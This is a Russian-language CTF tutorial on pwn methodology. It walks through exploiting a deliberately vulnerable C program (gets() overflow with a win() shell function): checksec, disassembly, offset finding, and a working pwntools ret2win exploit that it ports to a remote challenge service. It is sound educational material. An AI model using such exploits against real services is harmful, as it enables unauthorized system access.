## Вопрос, с которого всё начинается

Ты получил незнакомый бинарь и адрес сервиса. С чего начать? Опытные игроки не бросаются писать эксплойт — они идут по одному и тому же порядку. Порядок и есть методология: он экономит часы и не даёт забыть важный шаг.

Разберём этот порядок на одном конкретном бинаре, шаг за шагом.

## Наш пример: challenge

```c
// challenge.c
#include <stdio.h>
#include <stdlib.h>

void win(void) { system("/bin/sh"); }

int main(void) {
    char buf[64];
    gets(buf);
    puts(buf);
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o challenge challenge.c
```

Дальше идём по шагам. Каждый шаг отвечает на один вопрос.

## Шаг 0. checksec — что включено

Первое, что смотрим — какие защиты включены. Это определяет, какой вектор вообще возможен.

```bash
$ checksec --file=./challenge
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Читаем вывод по-простому:

- **No canary** — между буфером и адресом возврата нет «стража» (canary). Значит, переполнение дойдёт до возврата беспрепятственно.
- **NX enabled** — стек помечен как неисполняемый, поэтому запустить свой код на стеке не выйдет.
- **No PIE** — адреса кода фиксированы, их можно вписывать в эксплойт напрямую.
- **Partial RELRO** — таблица адресов функций (GOT) частично перезаписываема; пригодится позже.

Уже на этом шаге понятно: перед нами классический ret2win — можно вернуться в функцию `win`.

## Шаг 1. Запускаем и смотрим поведение

Прежде чем ломать, посмотрим, что программа делает.

```bash
$ ./challenge
hello
hello
```

Она читает строку и печатает её обратно. Никаких меню и паролей. Проверим реакцию на длинный ввод:

```bash
$ python3 -c "print('A'*200)" | ./challenge
Segmentation fault (core dumped)
```

Падает — значит, переполнение есть и доходит до адреса возврата.

## Шаг 2. Ищем, где ввод уходит в опасную функцию

Откроем дизассемблер и найдём функцию, которая читает наш ввод. Нам нужна та, что не проверяет длину.

```bash
$ objdump -d -M intel ./challenge | sed -n '/<main>:/,/ret/p'
```

```asm
4011c7 <main>:
  4011cb:  sub    rsp, 0x40
  4011cf:  lea    rax, [rbp-0x40]
  4011d3:  mov    rdi, rax
  4011d6:  call   gets@plt          ; <- вот она, gets
```

`gets` не знает про размер буфера — это и есть дырка. Заодно проверим, что в бинаре есть `win`:

```bash
$ nm ./challenge | grep -i win
00000000004011a6 T win
```

Функция есть, адрес фиксирован (PIE выключен). Вектор подтверждён.

## Шаг 3. Выбираем примитив под защиты

Примитив — это что именно мы сделаем с багом. Выбор диктуется защитами:

| Что видим | Что делаем |
|---|---|
| No canary, No PIE, есть `win` | ret2win напрямую |
| NX, нет `win` | ROP-цепочка / ret2libc |
| Canary | сначала утечка canary, потом переполнение |
| PIE | сначала утечка адреса кода |
| Full RELRO | перезапись `__free_hook`/`_IO_*`, а не GOT |

У нас No canary, No PIE и есть `win` — берём ret2win, самый простой примитив.

## Шаг 4. Собираем и отлаживаем эксплойт

Сначала найдём смещение до возврата. Здесь работает cyclic из предыдущих уроков:

```python
>>> from pwn import *
>>> cyclic_find(0x6161616b6161616a)
72
```

Собираем эксплойт через pwntools:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./challenge')
OFFSET = 72
win = elf.symbols['win']

p = process('./challenge')
p.sendline(flat({OFFSET: win}))
p.interactive()
```

```bash
$ python3 exp.py
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Работает. Если бы не работало, следующий шаг — открыть GDB (`gdb.attach(p)`), поставить брейкпоинт на `ret` в `main` и посмотреть, куда реально уходит управление.

## Шаг 5. Переносим на удалённый сервис

Локально готово — меняем только способ подключения, логика та же:

```python
def start():
    if args.REMOTE:
        return remote('chal.ctf.example', 1337)
    return process('./challenge')
```

```bash
$ python3 exp.py REMOTE
```

Если на сервере другой libc или включён ASLR, может потребоваться утечка — но каркас остаётся неизменным.

## Если в задаче меню

Не все задачи читают одну строку и падают. Часто программа показывает меню и ждёт, какой пункт выбрать. Тогда ввод надо подавать синхронно с выводом — для этого есть `recvuntil` и `sendafter`: сначала дождаться приглашения, потом отправить данные.

```python
p.recvuntil(b'> ')        # ждём приглашение меню
p.sendline(b'1')          # выбираем пункт
p.recvuntil(b'name: ')    # ждём следующий вопрос
p.sendline(payload)       # отправляем полезную нагрузку
```

Слепой `sendline` без ожидания приглашения — частая причина «эксплойт работает руками, но не в скрипте»: данные приходят раньше, чем программа готова их читать.

## Примерный тайминг

Ориентир, сколько времени занимают шаги на несложной задаче:

| Этап | Время |
|---|---|
| checksec и запуск | 1–2 минуты |
| поиск уязвимой функции | 5–10 минут |
| поиск смещения | ~5 минут |
| сборка и отладка эксплойта | 10–30 минут |
| перенос на удалённый сервис | ~5 минут |

Если этап «поиск уязвимой функции» растянулся на час — вероятно, выбран не тот путь; стоит перечитать дизассемблер или проверить другие функции.

## Что делать, если задача не поддаётся

Иногда эксплойт «почти работает», но стабильно падает. Порядок действий такой:

1. **Вернуться к отладке.** Поставить брейкпоинт на `ret` в уязвимой функции и посмотреть `telescope $rsp`: те ли адреса лежат на стеке.
2. **Проверить смещение.** Прогнать `cyclic` ещё раз — ошибка на 8 байт встречается чаще всего.
3. **Проверить выравнивание.** Падение в libc на `movaps` — добавить лишний `ret`.
4. **Проверить версию libc.** Локально и на сервере libc может отличаться; тогда нужна утечка и libc-database.
5. **Упростить.** Временно заменить сложную цепочку на ret2win, убедиться, что контроль есть, потом усложнять.

Инструменты разведки, которые пригодятся на каждом шаге:

| Инструмент | Что даёт |
|---|---|
| `checksec` | список защит бинаря |
| `file` | архитектура и тип файла |
| `nm` | символы (есть ли `win`) |
| `objdump -d` | дизассемблер |
| `strings` | подсказки, пути, версии |
| `readelf -s` | таблица символов |
| `ROPgadget` | доступные гаджеты |
| `one_gadget` | готовые цепочки в libc |

## Что мы теперь знаем

- Методология pwn — это фиксированный порядок шагов, а не хаос.
- Сначала `checksec`: защиты определяют, какой вектор возможен.
- Потом поведение программы: что она читает и падает ли на длинном вводе.
- Затем поиск опасной функции в дизассемблере (`gets`, `strcpy`, `read` без проверки).
- Примитив выбирается под защиты, а не наугад.
- Эксплойт сначала отлаживается локально, и только потом переносится на сервер.

## Куда дальше

Чек-лист универсален, но пока мы работаем только с ret2win. В следующих уроках он обрастёт деталями: `pwn-gdb-pwndbg` научит отладке, `pwn-shellcode` — запуску своего кода, `pwn-format-string` — утечкам и записи. Запомни главное: **сначала защиты и поведение, потом вектор, и только потом эксплойт.**

## Где пригодится

- **CTF Pwn:** чек-лист ускоряет разбор незнакомых задач в разы.
- **Эксплуатация бинарников:** тот же порядок применяется к реальным уязвимым сервисам.
- **Vulnerability research:** системный триаж — обязательный навык при анализе CVE.
- **Работа:** методология помогает не потеряться в чужом коде и документировать шаги.
